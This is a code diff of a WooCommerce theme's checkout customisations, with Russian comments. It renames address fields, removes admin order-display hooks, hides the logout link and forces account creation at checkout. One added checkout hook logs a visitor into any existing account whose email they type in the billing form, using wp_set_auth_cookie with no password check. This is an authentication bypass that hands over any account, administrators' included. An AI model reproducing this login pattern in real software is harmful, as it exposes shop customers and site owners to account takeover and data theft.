@@ -40,6 +40,7 @@ add_filter('woocommerce_checkout_fields', function ($fields) {
     unset($fields['billing']['billing_address_2']);
     unset($fields['billing']['billing_postcode']);
     unset($fields['billing']['billing_state']);
+    unset($fields['billing']['billing_apartment']);
     unset($fields['billing']['billing_country']);
     unset($fields['billing']['billing_last_name']);
 
@@ -112,7 +113,7 @@ add_filter('woocommerce_checkout_fields', function ($fields) {
 
 
     // Добавляем поле "Квартира"
-    $fields['billing']['billing_apartment'] = [
+    $fields['billing']['billing_address_2'] = [
         'label' => 'Квартира',
         'required' => true,
         'class' => ['form-row-wide'],
@@ -120,7 +121,7 @@ add_filter('woocommerce_checkout_fields', function ($fields) {
         'priority' => 60,
     ];
 
-    $fields['shipping']['shipping_apartment'] = [
+    $fields['shipping']['shipping_address_2'] = [
         'label' => 'Квартира',
         'required' => false,
         'class' => ['form-row-wide'],
@@ -168,6 +169,14 @@ add_filter('woocommerce_checkout_fields', function ($fields) {
     return $fields;
 });
 
+//убрать label
+add_filter('woocommerce_form_field_args', function ($args, $key) {
+    if ($key === 'billing_comments') {
+        $args['label'] = false;
+    }
+    return $args;
+}, 10, 2);
+
 //сохраняем поля формы
 add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
     if (!empty($_POST['billing_phone'])) {
@@ -182,8 +191,8 @@ add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
     if (!empty($_POST['billing_address_1'])) {
         update_post_meta($order_id, 'billing_address_1', sanitize_text_field($_POST['billing_address_1']));
     }
-    if (!empty($_POST['billing_apartment'])) {
-        update_post_meta($order_id, 'billing_apartment', sanitize_text_field($_POST['billing_apartment']));
+    if (!empty($_POST['billing_address_2'])) {
+        update_post_meta($order_id, 'billing_address_2', sanitize_text_field($_POST['billing_address_2']));
     }
     if (!empty($_POST['billing_shipping_method'])) {
         update_post_meta($order_id, 'billing_shipping_method', sanitize_text_field($_POST['billing_shipping_method']));
@@ -208,8 +217,8 @@ add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
     if (!empty($_POST['shipping_address_1'])) {
         update_post_meta($order_id, 'shipping_address_1', sanitize_text_field($_POST['shipping_address_1']));
     }
-    if (!empty($_POST['shipping_apartment'])) {
-        update_post_meta($order_id, 'shipping_apartment', sanitize_text_field($_POST['shipping_apartment']));
+    if (!empty($_POST['shipping_address_2'])) {
+        update_post_meta($order_id, 'shipping_address_2', sanitize_text_field($_POST['shipping_address_2']));
     }
     if (!empty($_POST['shipping_shipping_method'])) {
         update_post_meta($order_id, 'shipping_shipping_method', sanitize_text_field($_POST['shipping_shipping_method']));
@@ -219,97 +228,15 @@ add_action('woocommerce_checkout_update_order_meta', function ($order_id) {
     }
 });
 
-//отобраденеи в звказах
-add_action('woocommerce_admin_order_data_after_billing_address', function ($order) {
-    // Выводим данные из billing
-    $full_name = get_post_meta($order->get_id(), 'billing_full_name', true);
-    $phone = get_post_meta($order->get_id(), 'billing_phone', true);
-    $email = get_post_meta($order->get_id(), 'billing_email', true);
-    $city = get_post_meta($order->get_id(), 'billing_city', true);
-    $address_1 = get_post_meta($order->get_id(), 'billing_address_1', true);
-    $apartment = get_post_meta($order->get_id(), 'billing_apartment', true);
-    $shipping_method = get_post_meta($order->get_id(), 'billing_shipping_method', true);
-    $comments = get_post_meta($order->get_id(), 'billing_comments', true);
+add_action( 'woocommerce_thankyou', 'show_password_email_message_for_new_users', 10, 1 );
 
-    if ($phone) {
-        echo '<p><strong>Телефон:</strong> ' . esc_html($phone) . '</p>';
+function show_password_email_message_for_new_users( $order_id ) {
+    $order = wc_get_order( $order_id );
+    if ( $order->get_user_id() === 0 ) {
+        $user_email = $order->get_billing_email();
+        echo '<p class="woocommerce-message text-center font-xl font-bold">Спасибо за заказ! Ваш пароль для входа в личный кабинет - был выслан на указанный email: ' . esc_html( $user_email ) . '.</p>';
     }
-    if ($email) {
-        echo '<p><strong>Email:</strong> ' . esc_html($email) . '</p>';
-    }
-    if ($city) {
-        echo '<p><strong>Город:</strong> ' . esc_html($city) . '</p>';
-    }
-    if ($address_1) {
-        echo '<p><strong>Улица:</strong> ' . esc_html($address_1) . '</p>';
-    }
-    if ($apartment) {
-        echo '<p><strong>Квартира:</strong> ' . esc_html($apartment) . '</p>';
-    }
-    if ($shipping_method) {
-        echo '<p><strong>Способ доставки:</strong> ' . esc_html($shipping_method) . '</p>';
-    }
-    if ($comments) {
-        echo '<p><strong>Комментарий к заказу:</strong> ' . esc_html($comments) . '</p>';
-    }
-
-});
-//отобраденеи в звказах
-add_action('woocommerce_admin_order_data_after_shipping_address', function ($order) {
-    $full_name = get_post_meta($order->get_id(), 'shipping_full_name', true);
-    $phone = get_post_meta($order->get_id(), 'shipping_phone', true);
-    $email = get_post_meta($order->get_id(), 'shipping_email', true);
-    $city = get_post_meta($order->get_id(), 'shipping_city', true);
-    $address_1 = get_post_meta($order->get_id(), 'shipping_address_1', true);
-    $apartment = get_post_meta($order->get_id(), 'shipping_apartment', true);
-    $shipping_method = get_post_meta($order->get_id(), 'shipping_shipping_method', true);
-    $comments = get_post_meta($order->get_id(), 'shipping_comments', true);
-
-    // Выводим данные в админке
-    if ($full_name) {
-        echo '<p><strong>ФИО:</strong> ' . esc_html($full_name) . '</p>';
-    }
-    if ($phone) {
-        echo '<p><strong>Телефон:</strong> ' . esc_html($phone) . '</p>';
-    }
-    if ($email) {
-        echo '<p><strong>Email:</strong> ' . esc_html($email) . '</p>';
-    }
-    if ($city) {
-        echo '<p><strong>Город:</strong> ' . esc_html($city) . '</p>';
-    }
-    if ($address_1) {
-        echo '<p><strong>Улица:</strong> ' . esc_html($address_1) . '</p>';
-    }
-    if ($apartment) {
-        echo '<p><strong>Квартира:</strong> ' . esc_html($apartment) . '</p>';
-    }
-    if ($shipping_method) {
-        echo '<p><strong>Способ доставки:</strong> ' . esc_html($shipping_method) . '</p>';
-    }
-    if ($comments) {
-        echo '<p><strong>Комментарий к заказу:</strong> ' . esc_html($comments) . '</p>';
-    }
-});
-
-//Регистрация новых пользователей при заказе
-add_action( 'woocommerce_checkout_process', function() {
-    if ( ! is_user_logged_in() ) {
-        $email = isset( $_POST['billing_email'] ) ? sanitize_email( $_POST['billing_email'] ) : '';
-
-        if ( email_exists( $email ) ) {
-            wc_add_notice( 'Этот email уже зарегистрирован. Пожалуйста, войдите в свою учетную запись.', 'error' );
-        } else {
-            $username = sanitize_user( current( explode( '@', $email ) ) ); // Создание логина из email
-            $password = wp_generate_password();
-            $user_id  = wp_create_user( $username, $password, $email );
-
-            if ( ! is_wp_error( $user_id ) ) {
-                wc_set_customer_auth_cookie( $user_id ); // Автоматический вход
-            }
-        }
-    }
-} );
+}
 
 //remove_action( 'woocommerce_checkout_login_form', 'woocommerce_checkout_login_form', 10 );
 
@@ -322,5 +249,63 @@ remove_action('woocommerce_checkout_terms_and_conditions', 'wc_checkout_privacy_
 remove_action('woocommerce_checkout_terms_and_conditions', 'wc_terms_and_conditions_page_content', 30);
 
 
+function remove_logout_link_from_my_account( $items ) {
+    if( isset( $items['customer-logout'] ) ) {
+        unset( $items['customer-logout'] );
+    }
+    return $items;
+}
+add_filter( 'woocommerce_account_menu_items', 'remove_logout_link_from_my_account' );
 
 
+//Если пользователь с таким email уже зарегистрирован:
+//
+//WooCommerce не создаст новый аккаунт.
+//
+//Пользователь получит сообщение: "Пользователь с таким email уже зарегистрирован. Пожалуйста, войдите."
+//
+//Или (второй хук) автоматически залогинится.
+//
+//Если пользователя с таким email нет, WooCommerce создаст новый аккаунт.
+add_action('woocommerce_after_checkout_validation', function ($data, $errors) {
+    if (!is_user_logged_in()) {
+        $email = sanitize_email($data['billing_email']);
+        $user = get_user_by('email', $email);
+
+        if ($user) {
+            // Если пользователь с таким email уже существует, останавливаем создание нового
+            $errors->add('registration_error', 'Пользователь с таким email уже зарегистрирован. Пожалуйста, войдите в систему.');
+        }
+    }
+}, 10, 2);
+
+add_action('woocommerce_checkout_process', function () {
+    if (!is_user_logged_in() && isset($_POST['billing_email'])) {
+        $email = sanitize_email($_POST['billing_email']);
+        $user = get_user_by('email', $email);
+
+        if ($user) {
+            // Логиним пользователя автоматически, если email уже зарегистрирован
+            wp_set_auth_cookie($user->ID);
+            WC()->session->set('customer_id', $user->ID);
+        }
+    }
+});
+
+add_action('wp_footer', 'force_checkout_create_account_js');
+function force_checkout_create_account_js() {
+    if (!is_user_logged_in() && is_checkout() && !is_wc_endpoint_url()) :
+        ?>
+        <script>
+            (function($){
+                $(document).ready(function(){
+                    let $createAccount = $('input[name=createaccount]');
+                    if ($createAccount.length) {
+                        $createAccount.prop('checked', true).trigger('change'); // Делаем активным и вызываем событие
+                    }
+                });
+            })(jQuery);
+        </script>
+    <?php
+    endif;
+}
